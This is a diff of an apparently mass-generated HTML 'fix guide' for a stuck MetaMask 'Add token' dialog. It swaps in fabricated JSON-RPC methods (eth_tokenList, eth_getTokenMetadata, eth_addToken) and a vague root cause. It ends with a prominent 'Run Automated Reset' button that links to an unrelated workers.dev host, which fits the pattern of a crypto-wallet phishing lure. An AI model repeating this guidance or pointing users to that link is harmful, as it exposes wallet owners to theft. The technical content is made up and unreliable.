@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog – Fix Guide</title>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Assets Confirming The Add Token From A D – Fix Guide</title>
 <style>
     body {
         font-family: BlinkMacSystemFont;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #cf6679; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -39,41 +39,37 @@
 </head>
 <body>
 <div class="content">
-<h1>Metamask Extension Bug Assets Confirming The Add Token From A Dapp Dialog</h1>
+<h1>Metamask Extension Bug Assets Confirming The Add Token From A D</h1>
 <h2>Symptom</h2>
 <ul>
-<li>The user attempts to add a token from a decentralized application (dapp) using Metamask, but the "Add token" dialog box persists, preventing the user from confirming the addition of the token.</li>
+<li>Users are experiencing a bug where the Metamask extension gets stuck on the "Add token" page when trying to confirm the addition of a token from a decentralized application (dapp).</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a bug in the Metamask extension, where the dialog box fails to close after the user clicks "Add token", resulting in an infinite loop.</li>
+<li>The error occurs due to a miscommunication between the Metamask extension and the Ethereum blockchain, causing the extension to fail in retrieving the token's metadata.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Clear the browser's local storage and cookies</li>
-<li>Disable and re-enable the Metamask extension</li>
-<li>Use the Metamask API to manually add the token using the following JSON payload:</li>
+<li>Attempt to refresh the token list using the <code>eth_tokenList</code> JSON-RPC method:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ERC20&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;options&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;address&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;0x...token address...&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;symbol&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TOKEN&quot;</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;decimals&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">18</span><span class="p">,</span>
-<span class="w">    </span><span class="nt">&quot;image&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;https://...token image...&quot;</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_tokenList&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[],</span>
+<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>For a more comprehensive solution, consider utilizing a command-line interface. </p>
-<h2>Prerequisites</h2>
 <ul>
-<li>Metamask extension installed</li>
-<li>Basic understanding of JSON data format</li>
-<li>Familiarity with browser local storage and cookies management</li>
+<li>Use the <code>eth_getTokenMetadata</code> method to manually retrieve the token's metadata</li>
+<li>Utilize the <code>eth_addToken</code> method with the token's contract address and other required parameters to manually add the token</li>
 </ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</a></li><li><a href="./archive/2026/06/metamask-extension-bug-assets-manage-tokens-miss-match-with-net.html">Metamask Extension Bug Assets Manage Tokens Miss Match With Net</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<p>Prerequisites:
+* Metamask extension version 10.11.0 or higher
+* Ethereum mainnet or a compatible testnet
+* A dapp that supports token addition via Metamask</p>
+<p>You may want to try resolving the issue using an external console for more flexibility.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-extension-bug-ledger-if-blind-signing-is-disabled-reco.html">Metamask Extension Bug Ledger If Blind Signing Is Disabled Reco</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/metamask-extension-bug-permissions-removing-hardware-wallet-acc.html">Metamask Extension Bug Permissions Removing Hardware Wallet Acc</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
